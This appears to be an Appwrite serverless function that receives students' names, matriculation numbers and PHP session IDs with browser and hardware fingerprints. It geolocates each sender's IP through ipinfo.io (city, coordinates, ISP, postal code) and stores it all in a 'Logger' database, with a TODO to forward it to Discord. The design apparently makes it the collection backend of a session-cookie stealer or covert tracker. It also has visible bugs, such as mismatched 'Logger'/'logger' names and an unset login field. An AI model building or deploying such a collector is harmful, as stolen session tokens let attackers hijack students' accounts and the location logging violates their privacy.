import { Databases, Client } from 'node-appwrite'

function validateBody(bodyJson) {
  const userBody = [ "name", "matric", "phpsess" ].toString()
  const deviceBody = [ "browser", "screen", "viewport", "CPU", "memory", "timezone","system" ].toString()
  
  try {
    if (Object.keys(bodyJson['user']).toString() != userBody || Object.keys(bodyJson['device']).toString() != deviceBody)
      { return false }
  } catch { return false }

  return true
}

async function storeData({ req, res, log, error }) {
  // Appwrite project
  const client = new Client()
    .setEndpoint('https://cloud.appwrite.io/v1')
    .setProject(process.env.APPWRITE_FUNCTION_PROJECT_ID);
    
  const database = new Databases(client);
  
  // Grab user IP and IP details
  const clientIP = req.headers['x-forwarded-for'] ? req.headers['x-forwarded-for'].split(',')[0] : req.socket.remoteAddress;
  const ipinfo = (await (await fetch(`https://ipinfo.io/${clientIP}/json`)).json());
  const sanitizedMatric = req.bodyJson['user']['matric']
    .trim()
    .replaceAll(' ', '_')
    .slice(0, 36);

  const userData = {
    Matric: req.bodyJson['user']['matric'],
    Name: req.bodyJson['user']['name'],
    LatestPHPSession: req.bodyJson['user']['phpsess'],
  }
  const deviceData = {
    System: req.bodyJson['device']['system'],
    Browser: req.bodyJson['device']['browser'],
    Screen: req.bodyJson['device']['screen'],
    Viewport: req.bodyJson['device']['viewport'],
    CPU: req.bodyJson['device']['CPU'],
    RAM: req.bodyJson['device']['memory'],
    Timezone: req.bodyJson['device']['timezone'],
  }
  const IPData = {
    Address: ipinfo['ip'],
    Country: ipinfo['country'],
    City: ipinfo['city'],
    Region: ipinfo['region'],
    Coordinates: ipinfo['loc'],
    ISP: ipinfo['org'],
    Postal: ipinfo['postal'],
    Hostname: ipinfo['hostname']
  } 
  
  // Create or update user document
  try {
    const userDoc = await database.getDocument('Logger', 'User', sanitizedMatric);
    if (!userDoc) {
      error(`User ${sanitizedMatric} already exists`)  
      throw "User does not exist"
    } 

    //Update user session and logintime
    await database.updateDocument('logger', 'User', sanitizedMatric, {
      LatestPHPSession: userData['LatestPHPSession'],
      LatestLogin: userData['LatestLogin']
    });

    // Check if Device already registered, if not append new Device to user document
    if (userDoc['Devices'].filter(device => device['System'] === req.bodyJson['device']['system']).length == 0) {
      await database.updateDocument('logger', 'User', sanitizedMatric, {
        Devices: [...userDoc['Devices'], deviceData]
      });

      log(`Device "${req.bodyJson['device']['system']}" successfully registered`);
    } else { log(`Device "${req.bodyJson['device']['system']}" already registered`); }

    // Check if IP already registered, if not append new IP to user document
    if (userDoc['IPs'].filter(ip => ip['Address'] === ipinfo['ip']).length == 0) {
      await database.updateDocument('logger', 'User', sanitizedMatric, {
        IPs: [...userDoc['IPs'], IPData]
      });

      log(`User IP "${ipinfo['ip']}" successfully registered`);
    } else { log(`User IP "${ipinfo['ip']}" already registered`); }
    
    log(`User ${sanitizedMatric} updated successfully`);
    return res.json({success: true, message: `User ${sanitizedMatric} updated successfully`});

  } catch(err) {
    // If user doesnt exist, the function will raise an error, and create new document with data
    log(deviceData);
    log(IPData);
    
    if (deviceData) {
      userData['Devices'] = await database.createDocument('Logger', 'Device', deviceData);
    } else {
      error("No device data available");
      return res.json({success: false, message: `User ${sanitizedMatric}: No device data available`});
    }
    if (IPData) {
      userData['IPs'] = await database.createDocument('Logger', 'IP Info', IPData);
    } else {
      error("No IP data available");
      return res.json({success: false, message: `User ${sanitizedMatric}: No IP data available`});  
    }
    await database.createDocument('Logger', 'User', sanitizedMatric, userData);

    log(`New user ${sanitizedMatric} added successfully`);
    log(`Device "${req.bodyJson['device']['system']}" successfully registered`);
    log(`User IP "${ipinfo['ip']}" successfully registered`);
    return res.json({success: true, message: `New user ${sanitizedMatric} added successfully`});
  }
}

export default async ({ req, res, log, error }) => {
  if (req.method != 'POST' || req.path != '/') {
    error('Method not allowed: ' + req.method);
    return res.json({success: false, message: "Method not allowed, Please send POST"});
  }

  if (!validateBody(req.bodyJson)) {
    error('Invalid data object: ' + req.bodyText);
    return res.json({success: false, message: "Invalid data object"});
  }

  // Store data in databse
  return storeData({ req, res, log, error });
};

// TODO: ADD METHOD TO SEND DATA TO DISCORD TOO AS A NOTIFICATAION SYSTEM